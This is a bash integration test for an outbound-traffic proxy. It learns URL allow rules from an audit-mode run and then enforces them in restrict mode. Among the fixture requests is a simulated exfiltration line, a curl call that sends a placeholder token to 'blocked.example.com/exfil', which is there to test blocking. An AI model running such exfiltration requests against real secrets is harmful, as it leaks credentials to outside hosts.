#!/bin/bash
# The audit-then-restrict round trip, which is what the inspect engine is for.
#
# Phase 1 runs a `run:` step under `audit`, checks its report enforced nothing,
# and extracts the `allowed_url_rules` the report generated from what it saw.
# Phase 2 runs again under `restrict`
# with exactly those rules, and nothing else, via
# test/inspect-roundtrip-scenarios.sh, repeating every request phase 1 made
# plus a few it never made.
#
# Both halves matter. Rules that break the run they were learned from make the
# workflow useless; rules that permit everything make it pointless.
#
# Phase 1 also sets ALLOWED_TLS_RULES, so the audit run has a real TLS
# passthrough to record. The report echoes allowed_tls_rules/allowed_ip_rules
# into the same fenced block as allowed_url_rules (see
# src/core/lib/report/render/inspect-example.ts), so the extraction below
# stops at those keys. Phase 2 leaves ALLOWED_TLS_RULES empty, so the learned
# URL rules have to stand alone.
set -uo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/driver-helpers.sh"

require_local_image inspect

echo ""
echo "=== Inspect Engine Integration Test (audit -> restrict round trip) ==="
echo ""

trap 'fixture_down inspect' EXIT
fixture_up inspect

TMPDIR=$(mktemp -d)

echo ""
echo "=== Phase 1: learn the rules from an audit run ==="

run_step inspect "$TMPDIR/audit" \
  INPUT_PROXY_MODE="audit" \
  INPUT_ALLOWED_TLS_RULES="tlspass.example.com:443" \
  INPUT_RUN="
S='curl -sS --max-time 10'
\$S https://allowed.example.com/public/pkg.tgz
\$S https://allowed.example.com/public/a/one.tgz
\$S https://allowed.example.com/public/b/two.tgz
\$S -X POST https://api.example.com/v1/thing
\$S http://allowed.example.com:9080/public/pkg.tgz
\$S https://allowed.example.com:9443/private/secret
\$S \"https://blocked.example.com/exfil?token=SECRET-VALUE\"
\$S --insecure https://tlspass.example.com/public/x
true"
AUDIT_EXIT=$?
cat "$TMPDIR/audit.log"

echo ""
echo "--- audit-phase exit code: $AUDIT_EXIT ---"
if [ "$AUDIT_EXIT" = "0" ]; then
  pass "audit mode enforced nothing, so the step succeeded"
else
  fail "the audit-phase step failed (should never block anything)"
fi

SUMMARY=$(cat "$TMPDIR/audit.md")

echo ""
echo "--- audit-phase report assertions (Job Summary) ---"
assert_report_complete
assert_summary_contains "📋 Audited Hosts" "audited-hosts heading present"
assert_summary_contains "| \`allowed.example.com:443\` | HTTPS |" "allowed.example.com:443 audited"
assert_summary_contains "| \`blocked.example.com:443\` | HTTPS |" "blocked.example.com:443 audited (nothing enforced)"
if grep -qF "🚫 Blocked" <<< "$SUMMARY"; then
  fail "audit mode produced a Blocked Hosts table"
else
  pass "no Blocked Hosts table in audit mode"
fi
assert_summary_contains "Switch to restrict mode" "restrict-mode example offered"
assert_summary_contains "POST https://api.example.com/v1/thing" "the example keeps the method it actually saw"
assert_summary_contains "GET https://blocked.example.com/exfil" "the example includes a host audit merely observed, for the reader to remove"

echo ""
echo "[report] allowed_tls_rules is echoed as configured, not derived from traffic:"
if grep -qF "allowed_tls_rules: |" <<< "$SUMMARY" && grep -qF "tlspass.example.com:443" <<< "$SUMMARY"; then
  pass "allowed_tls_rules appears in the restrict-mode example"
else
  fail "allowed_tls_rules is missing from the restrict-mode example"
fi

RULES=$(
  # Stops at the next top-level key (allowed_tls_rules/allowed_ip_rules are
  # echoed into the same fenced block, see inspect-example.ts) as well as the
  # closing fence, so only the allowed_url_rules value is captured.
  awk '
    /allowed_url_rules: \|/ { capture=1; next }
    capture && /^ *(allowed_tls_rules|allowed_ip_rules): \|/ { exit }
    capture && /```/ { exit }
    capture { print }
  ' <<< "$SUMMARY" | sed 's/^ *//'
)

if [ -z "$RULES" ]; then
  fail "the audit report generated no allowed_url_rules"
else
  pass "the audit report generated allowed_url_rules"
fi

echo ""
echo "Rules generated from the audit run:"
# shellcheck disable=SC2001 # indents every line, not just the first
sed 's/^/    /' <<< "$RULES"

echo ""
echo "=== Phase 2: enforce them, unedited ==="

run_step inspect "$TMPDIR/restrict" \
  INPUT_PROXY_MODE="restrict" \
  INPUT_ALLOWED_URL_RULES="$RULES" \
  INPUT_ALLOWED_TLS_RULES="" \
  INPUT_FAIL_ON_BLOCKED="false" \
  INPUT_RUN="bash $REPO_ROOT/test/inspect-roundtrip-scenarios.sh"
RESTRICT_EXIT=$?
cat "$TMPDIR/restrict.log"

echo ""
echo "--- restrict-phase exit code: $RESTRICT_EXIT ---"
if [ "$RESTRICT_EXIT" = "0" ]; then
  pass "the generated rules permit everything the audit run did, and block what it never did"
else
  fail "one or more round-trip scenarios failed (see log above)"
fi

rm -rf "$TMPDIR"

assert_results
